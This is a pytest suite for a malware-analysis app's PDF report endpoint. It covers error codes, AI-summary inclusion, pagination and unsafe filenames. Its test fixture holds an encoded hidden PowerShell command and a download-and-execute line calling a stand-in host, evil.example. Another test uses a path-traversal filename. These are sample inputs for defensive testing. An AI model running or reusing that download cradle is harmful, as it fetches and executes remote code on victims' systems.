"""End-to-end: /report/pdf endpoint + PDF content (no real Ollama needed).

Covers: valid report, 404, incomplete analysis, AI available / unavailable /
error, large evidence, malicious filenames.
"""
import json
import time
from io import BytesIO

from pypdf import PdfReader

from app.database import SessionLocal
from app.models import AnalysisResult, Investigation, new_id, utcnow
from app.services.ai import AIProvider, AIUnavailable

MALICIOUS_PS1 = (
    "powershell -nop -windowstyle hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgA"
    'aAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQA' + "\r\n"
    "invoke-expression (New-Object Net.WebClient).DownloadString('http://evil.example/payload')" + "\r\n"
    "attacker@evil.example" + "\r\n"
    "C:\\Users\\victim\\AppData\\Roaming\\backup.exe" + "\r\n"
)

_VARIANTS = {
    "basic": MALICIOUS_PS1 + "# variant: report-basic\n",
    "ai": MALICIOUS_PS1 + "# variant: report-ai\n",
    "noollama": MALICIOUS_PS1 + "# variant: report-noollama\n",
}


class FakeProvider(AIProvider):
    name = "fake"

    def __init__(self, down=False):
        self.down = down
        self.calls = 0

    def label(self):
        return "ollama/fake"

    def select_model(self):
        if self.down:
            raise AIUnavailable("cannot reach Ollama")
        return "fake-model"

    def generate(self, prompt, model):
        self.calls += 1
        return ('{"executive_summary": "A PowerShell downloader was identified.", '
                '"technical_summary": "Encoded PowerShell downloads a payload.", '
                '"threat_explanation": "The evidence shows scripted download activity.", '
                '"key_findings": ["Suspicious PowerShell", "Downloader behaviour"], '
                '"risk_factors": ["Encoded command", "External URL"], '
                '"mitre_explanation": [{"technique_id": "T1059.001", '
                '"explanation": "Encoded PowerShell execution"}], '
                '"recommendations": [{"priority": "high", "action": "Quarantine host"}], '
                '"confidence": 80, "business_impact": ["Credential exposure"], '
                '"limitations": ["Static analysis only — no execution observed"]}')


def _wait_completed(client, inv_id, timeout=20.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        inv = client.get(f"/api/investigations/{inv_id}").json()
        if inv["status"] == "completed":
            return inv
        time.sleep(0.25)
    raise AssertionError(f"analysis did not complete within {timeout}s (status={inv['status']})")


def _upload(client, variant="basic"):
    created = client.post(
        "/api/samples/upload",
        files={"file": ("report_check.ps1", _VARIANTS[variant].encode(), "application/octet-stream")},
    ).json()["investigation"]
    _wait_completed(client, created["id"])
    return created["id"]


def _pdf_text(pdf: bytes) -> str:
    reader = PdfReader(BytesIO(pdf))
    return "".join(page.extract_text() or "" for page in reader.pages)


def _make_investigation(filename="synthetic.bin", status="completed", extra=None) -> tuple[str, dict]:
    db = SessionLocal()
    try:
        inv = Investigation(
            id=new_id(), case_id=f"INV-2099-{str(new_id())[:4]}", filename=filename,
            file_type="script", mime_type="text/plain", size_bytes=100, sha256="d" * 64,
            md5="e" * 32, sha1="f" * 40, storage_path="nope", status=status,
            severity="medium", risk_score=30, classification="Suspicious - downloader",
            verdict="suspicious", uploaded_at=utcnow(),
        )
        db.add(inv)
        if status == "completed":
            payload = _synthetic_payload()
            if extra:
                payload.update(extra)
            db.add(AnalysisResult(investigation_id=inv.id, file_sha256=inv.sha256,
                                  data=json.dumps(payload)))
        db.commit()
        return inv.id, db
    except Exception:
        db.rollback()
        raise


def _synthetic_payload() -> dict:
    return {
        "fileType": "script", "family": "script", "description": "test",
        "modules": {"filetype": "ok", "script": "ok"},
        "static": {"entropy": 5.0, "lineCount": 2, "strings": [], "yara": []},
        "findings": [
            {"severity": "high", "category": "downloader", "title": "Downloads content",
             "detail": "download primitive", "confidence": 0.8, "mitre": "T1105",
             "mitre_techniques": ["T1105"], "module": "script", "evidence": "scan"},
        ],
        "score": {"total": 30, "severity": "medium", "verdict": "suspicious",
                  "breakdown": [{"category": "downloader", "points": 15, "max": 100}],
                  "method": "dedup weights"},
        "evidence": [{"id": "ev-0001", "type": "url", "category": "network",
                      "value": "http://x.example/", "source_module": "strings",
                      "severity": "medium", "confidence": 0.8, "mitre_techniques": ["T1071"]}],
        "iocs": [{"id": "ioc-0001", "type": "url", "value": "http://x.example/",
                  "severity": "medium", "confidence": 0.8,
                  "sources": [{"module": "strings"}], "count": 1,
                  "mitre_techniques": ["T1071"]}],
        "mitre": [{"technique_id": "T1105", "technique": "Ingress Tool Transfer",
                   "tactic": "Command and Control", "confidence": 0.8, "severity": "high",
                   "source_modules": ["script"], "findings": ["Downloads content"],
                   "evidence": ["scan"]}],
        "classification": "Suspicious - downloader",
        "tags": ["downloader"], "detections": 0, "total_engines": 2,
        "mitre_techniques": ["T1105"],
    }


def test_report_generates_pdf(client):
    inv_id = _upload(client)
    res = client.get(f"/api/investigations/{inv_id}/report/pdf")
    assert res.status_code == 200
    assert res.headers["content-type"] == "application/pdf"
    assert "attachment" in res.headers["content-disposition"]
    assert "-report.pdf" in res.headers["content-disposition"]
    assert res.content[:4] == b"%PDF"

    text = _pdf_text(res.content)
    for probe in ("Secure File Investigation Report", "Deterministic threat assessment",
                  "Recommendations", "Limitations", "File Information", "Report Metadata"):
        assert probe in text, f"missing {probe!r} in report text"


def test_report_404_for_unknown_investigation(client):
    res = client.get("/api/investigations/does-not-exist/report/pdf")
    assert res.status_code == 404


def test_report_incomplete_analysis_returns_409(client):
    inv_id, db = _make_investigation(status="queued")
    try:
        res = client.get(f"/api/investigations/{inv_id}/report/pdf")
        assert res.status_code == 409
        assert "not completed" in res.json()["detail"]
    finally:
        db.close()


def test_report_includes_validated_ai_when_available(client, monkeypatch):
    monkeypatch.setattr("app.services.ai.providers.get_provider", lambda: FakeProvider())
    inv_id = _upload(client, "ai")
    ai_res = client.get(f"/api/investigations/{inv_id}/ai").json()
    assert ai_res["status"] == "completed"  # caches the validated result

    res = client.get(f"/api/investigations/{inv_id}/report/pdf")
    assert res.status_code == 200
    text = _pdf_text(res.content)
    assert "A PowerShell downloader was identified." in text
    assert "AI-assisted interpretation" in text
    assert "ollama/fake" in text
    assert "Quarantine host" in text
    assert "AI-assisted interpretation was unavailable" not in text


def test_report_ai_unavailable_does_not_call_ollama(client, monkeypatch):
    def boom():
        raise AssertionError("report generation must never call the AI provider")

    monkeypatch.setattr("app.services.ai.providers.get_provider", boom)
    inv_id = _upload(client, "noollama")
    res = client.get(f"/api/investigations/{inv_id}/report/pdf")
    assert res.status_code == 200
    text = _pdf_text(res.content)
    assert "AI-assisted interpretation was unavailable" in text
    assert "A PowerShell downloader was identified." not in text  # no AI content


def test_report_ai_error_state_is_safe(client):
    inv_id, db = _make_investigation()
    try:
        result = db.query(AnalysisResult).filter(
            AnalysisResult.investigation_id == inv_id
        ).first()
        payload = json.loads(result.data)
        payload["ai"] = {"status": "error", "provider": "ollama/fake",
                         "reason": "SECRET_INTERNAL_EXCEPTION_DETAILS",
                         "note": "rejected"}
        result.data = json.dumps(payload)
        db.commit()

        res = client.get(f"/api/investigations/{inv_id}/report/pdf")
        assert res.status_code == 200
        text = _pdf_text(res.content)
        assert "could not be validated" in text
        assert "SECRET_INTERNAL_EXCEPTION_DETAILS" not in text
    finally:
        db.close()


def test_report_large_evidence_paginates_without_truncation(client):
    long_url = "https://cdn.evil-c2.example/" + "x" * 260 + ".php"
    long_path = "C:\\Users\\victim\\AppData\\Roaming\\" + "p" * 160 + ".exe"
    long_cmd = "powershell -enc " + "A" * 200

    payload = _synthetic_payload()
    payload["iocs"] = [
        {"id": f"ioc-{i:04d}", "type": ("url" if i % 2 else "windows_path"),
         "value": (long_url if i % 2 else long_path), "severity": "medium",
         "confidence": 0.8, "sources": [{"module": "strings"}], "count": 1,
         "mitre_techniques": []} for i in range(250)
    ]
    payload["findings"] = payload["findings"] * 20
    payload["evidence"] = [
        {"id": f"ev-{i:04d}", "type": "command", "category": "execution",
         "value": long_cmd, "source_module": "strings", "severity": "medium",
         "confidence": 0.7, "mitre_techniques": []} for i in range(60)
    ]
    payload["mitre"] = payload["mitre"] * 40

    inv_id, db = _make_investigation(extra=payload)
    try:
        res = client.get(f"/api/investigations/{inv_id}/report/pdf")
        assert res.status_code == 200
        reader = PdfReader(BytesIO(res.content))
        assert len(reader.pages) > 1, "large report must paginate"
        text = "".join(p.extract_text() or "" for p in reader.pages)
        assert long_url[:60] in text.replace(" ", "")
        assert long_path[:60].lower() in text.lower()
    finally:
        db.close()


def test_report_malicious_filename_is_safe(client):
    nasty = "..\\..\\..\\evil<>&report.pdf"
    inv_id, db = _make_investigation(filename=nasty)
    try:
        res = client.get(f"/api/investigations/{inv_id}/report/pdf")
        assert res.status_code == 200
        # the download filename is derived from the server-generated case id only
        disposition = res.headers["content-disposition"]
        assert ".." not in disposition
        assert "evil" not in disposition
        assert "-report.pdf" in disposition
        text = _pdf_text(res.content)
        assert "evil" in text  # filename is still shown as submitted, escaped safely
    finally:
        db.close()
